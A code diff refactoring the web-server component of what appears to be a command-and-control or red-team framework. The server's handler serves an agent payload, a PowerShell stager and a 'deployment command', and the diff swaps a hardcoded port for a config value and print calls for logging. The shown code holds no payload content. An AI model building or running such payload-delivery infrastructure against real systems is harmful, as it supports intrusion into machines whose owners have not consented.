@@ -7,8 +7,14 @@ import json
 import base64
 import threading
 import webbrowser
+import logging
 
-PORT = 8080
+from whisper_config import load_config
+
+log = logging.getLogger("whisper.web")
+
+CONFIG = load_config()
+PORT = CONFIG.web_port
 HOST = "0.0.0.0"
 AGENT_FILE = ""
 STAGER_FILE = ""
@@ -100,7 +106,7 @@ class PayloadHandler(http.server.SimpleHTTPRequestHandler):
             super().do_GET()
 
     def log_message(self, format, *args):
-        sys.stderr.write(f"[WEB] {args[0]} {args[1]} {args[2]}\n")
+        log.info("%s %s %s", args[0], args[1], args[2])
 
 class ThreadedServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
     allow_reuse_address = True
@@ -111,15 +117,15 @@ def start_web_server(agent_path="", port=PORT):
     AGENT_FILE = agent_path
     PORT = port
     server = ThreadedServer((HOST, port), PayloadHandler)
-    print(f"[WEB] Server running at http://0.0.0.0:{port}")
+    log.info("Server running at http://0.0.0.0:%d", port)
     if AGENT_FILE:
-        print(f"[WEB] Serving payload: {AGENT_FILE}")
-    print(f"[WEB] Stager: http://0.0.0.0:{port}/stager.ps1")
-    print(f"[WEB] Deployment command: http://0.0.0.0:{port}/command\n")
+        log.info("Serving payload: %s", AGENT_FILE)
+    log.info("Stager: http://0.0.0.0:%d/stager.ps1", port)
+    log.info("Deployment command: http://0.0.0.0:%d/command", port)
     try:
         server.serve_forever()
     except KeyboardInterrupt:
-        print("\n[WEB] Server stopped")
+        log.info("Server stopped by user")
         server.shutdown()
     return server
 
